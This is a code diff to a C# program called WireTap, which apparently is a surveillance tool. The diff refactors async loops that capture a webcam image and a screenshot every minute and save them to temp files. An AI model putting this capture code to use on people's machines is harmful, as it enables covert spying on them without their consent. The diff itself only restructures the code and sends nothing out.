@@ -1,11 +1,11 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Speech.Recognition;
-using System.Threading.Tasks;
-
-namespace WireTap
+﻿namespace WireTap
 {
-    class Program
+    using System;
+    using System.Collections.Generic;
+    using System.Speech.Recognition;
+    using System.Threading.Tasks;
+
+    public class Program
     {
         static async Task Main(string[] args)
         {
@@ -99,20 +99,20 @@ namespace WireTap
             }
             if (captureWebCam)
             {
-                tasks.Add(Task.Factory.StartNew(() =>
+                tasks.Add(Task.Run(async () =>
                 {
                     Console.WriteLine("Inside captureWebCam");
                     while (true)
                     {
                         string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
                         WebCam.CaptureImage(tempFile);
-                        return Task.Delay(TimeSpan.FromMinutes(1));
+                        await Task.Delay(TimeSpan.FromMinutes(1));
                     }
                 }));
             }
             if (captureScreen)
             {
-                tasks.Add(Task.Factory.StartNew(() =>
+                tasks.Add(Task.Run(async () =>
                 {
                     Console.WriteLine("Inside captureScreen");
                     while (true)
@@ -120,7 +120,7 @@ namespace WireTap
                         string tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
                         Display.CaptureImage(tempFile);
                         Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
-                        return Task.Delay(TimeSpan.FromMinutes(1));
+                        await Task.Delay(TimeSpan.FromMinutes(1));
                     }
                 }));
             }
